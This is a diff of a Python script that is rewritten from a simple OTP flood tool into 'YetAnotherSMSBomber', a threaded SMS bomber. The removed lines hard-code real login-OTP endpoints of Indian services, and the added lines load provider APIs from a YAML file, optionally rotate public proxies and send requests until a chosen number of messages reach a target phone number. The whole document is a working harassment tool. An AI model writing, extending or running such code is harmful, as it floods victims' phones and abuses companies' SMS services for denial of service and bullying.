@@ -1,67 +1,177 @@
+#!/usr/bin/env python3
+
+# SPDX-License-Identifier: GPL-3.0-or-later
+
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from utils import APIRequestsHandler, CustomArgumentParser
 import requests
-import threading
+import random
 import time
-import sys
 
-# --- CONFIGURATION ---
-# Replace these with real API endpoints you find using Inspect Element -> Network tab
-# format: {"url": "...", "method": "POST", "data": {"phone_field": "TARGET"}}
-APIS = [
-    {"url": "https://p.paytm.me/api/v1/login/otp", "method": "POST", "data": {"phone": "TARGET"}},
-    {"url": "https://api.zomato.com/v2/otp/send", "method": "POST", "data": {"mobile": "TARGET"}},
-    {"url": "https://www.bigbasket.com/svc/registration/otp-gen/", "method": "GET", "params": {"otp_type": "1", "mobile_number": "TARGET"}},
-    # Add 10-15 more active endpoints here for maximum speed
-]
+from yaml import load
 
-# Protection List (White-list your own number here)
-PROTECTED = ["919876543210"] 
+try:
+    from yaml import CLoader as Loader
+except ImportError:
+    from yaml import Loader
 
-def send_otp(api, target):
-    try:
-        # Prepare the data by replacing 'TARGET' with the actual number
-        payload = {}
-        for k, v in api.get("data", {}).items():
-            payload[k] = target if v == "TARGET" else v
-        
-        params = {}
-        for k, v in api.get("params", {}).items():
-            params[k] = target if v == "TARGET" else v
 
-        if api["method"] == "POST":
-            r = requests.post(api["url"], json=payload, timeout=5)
-        else:
-            r = requests.get(api["url"], params=params, timeout=5)
-            
-        if r.status_code == 200:
-            print(f" \033[1;32m[+]\033[0m Success: {api['url'].split('/')[2]}")
-    except:
-        pass
+parser = CustomArgumentParser(
+    allow_abbrev=False,
+    add_help=False,
+    description="YetAnotherSMSBomber - A clean, small and powerful SMS bomber script.",
+    epilog="Use this for fun, not for revenge or bullying!",
+)
+parser.add_argument(
+    "target",
+    metavar="TARGET",
+    type=lambda x: (13 >= len(str(int(x))) >= 4)
+    and int(x)
+    or parser.error('"%s" is an invalid mobile number!' % int(x)),
+    help="Target mobile number without country code.",
+)
+parser.add_argument(
+    "--config-path",
+    "-c",
+    default="services.yaml",
+    help="Path to API services file. (NOTE: the file must be in proper YAML format!)",
+)
+parser.add_argument(
+    "--num", "-N", type=int, help="Number of SMSs to send to TARGET.", default=30
+)
+parser.add_argument(
+    "--country",
+    "-C",
+    type=int,
+    help="Country code without (+) sign.",
+    default=91,
+)
+parser.add_argument(
+    "--threads",
+    "-T",
+    type=int,
+    help="Max number of concurrent HTTP(s) requests.",
+    default=15,
+)
+parser.add_argument(
+    "--timeout",
+    "-t",
+    type=int,
+    help="Time (in seconds) to wait for an API request to complete.",
+    default=10,
+)
+parser.add_argument(
+    "--proxy",
+    "-P",
+    action="store_true",
+    help="Use proxy for bombing. (Recommended for large number of SMSs)",
+)
+parser.add_argument(
+    "--verbose",
+    "-v",
+    action="store_true",
+    help="Enables verbose output, for debugging.",
+)
+parser.add_argument(
+    "--verify",
+    "-V",
+    action="store_true",
+    help="To verify all providers are working or not.",
+)
+parser.add_argument("-h", "--help", action="help", help="Display this message.")
+args = parser.parse_args()
 
-def start_flood(target, count):
-    if target in PROTECTED:
-        print("\n \033[1;31m[!] ERROR: This number is white-listed and protected.\033[0m")
+# config loading
+config = args.config_path
+target = str(args.target)
+country_code = str(args.country)
+no_of_threads = args.threads
+no_of_sms = args.num
+failed, success = 0, 0
+
+print(ascii_art)
+not args.verbose and not args.verify and print(
+    f"Target: {target} | Threads: {no_of_threads} | SMS-Bombs: {no_of_sms}"
+)
+
+
+# proxy setup
+def get_proxy():
+    args.verbose and print("Fetching proxies from server.....")
+    curl = requests.get("http://pubproxy.com/api/proxy?format=txt").text
+    if "http://pubproxy.com/#premium" in curl:
+        args.verbose and print(
+            "Proxy limitation error, proceeding without a proxy now.."
+        )
         return
+    args.verbose and print(f"Using Proxy: {curl}")
+    return {"http": curl, "https": curl}
 
-    print(f"\n \033[1;33m[*] Launching Flood on {target} ({count} requests)...\033[0m")
-    threads = []
-    
-    for i in range(count):
-        api = APIS[i % len(APIS)]
-        t = threading.Thread(target=send_otp, args=(api, target))
-        threads.append(t)
-        t.start()
-        time.sleep(0.05) # Super fast interval (0.05s)
 
-    for t in threads:
-        t.join()
-    
-    print(f"\n \033[1;32m[!] Stress Test Completed.\033[0m")
+proxies = get_proxy() if args.proxy else None
 
-if __name__ == "__main__":
-    if len(sys.argv) < 3:
-        print("Usage: python3 bomber.py <number> <count>")
-    else:
-        # Auto-format to 10 digits for Indian APIs if needed
-        num = sys.argv[1]
-        if len(num) == 10: num = "91" + num
-        start_flood(num, int(sys.argv[2]))
+# threadsssss
+start = time.time()
+providers = (load(open(config, "r"), Loader=Loader))["providers"]
+if args.verify:
+    pall = [p for x in providers.values() for p in x]
+    print(f"Processing {len(pall)} providers, please wait!\n")
+    with ThreadPoolExecutor(max_workers=len(pall)) as executor:
+        jobs = [
+            executor.submit(
+                (
+                    APIRequestsHandler(
+                        target,
+                        proxy=proxies,
+                        verbose=args.verbose,
+                        verify=True,
+                        timeout=args.timeout,
+                        cc=country_code,
+                        config=config,
+                    )
+                ).start
+            )
+            for config in pall
+        ]
+
+        for job in as_completed(jobs):
+            result = job.result()
+            if result:
+                success += 1
+            else:
+                failed += 1
+else:
+    while success < no_of_sms:
+        with ThreadPoolExecutor(max_workers=no_of_threads) as executor:
+            jobs = []
+            for _ in range(no_of_sms - success):
+                p = APIRequestsHandler(
+                    target,
+                    proxy=proxies,
+                    verbose=args.verbose,
+                    timeout=args.timeout,
+                    cc=country_code,
+                    config=random.choice(
+                        providers[country_code] + providers["multi"]
+                        if country_code in providers
+                        else providers["multi"]
+                    ),
+                )
+                jobs.append(executor.submit(p.start))
+            for job in as_completed(jobs):
+                if result := job.result():
+                    success += 1
+                else:
+                    failed += 1
+                not args.verbose and print(
+                    f"Requests: {success+failed} | Success: {success} | Failed: {failed}",
+                    end="\r",
+                )
+end = time.time()
+
+# finalize
+if args.verbose or args.verify:
+    print(f"\nSuccess: {success} | Failed: {failed}")
+else:
+    print()
+print(f"Took {end-start:.2f}s to complete")
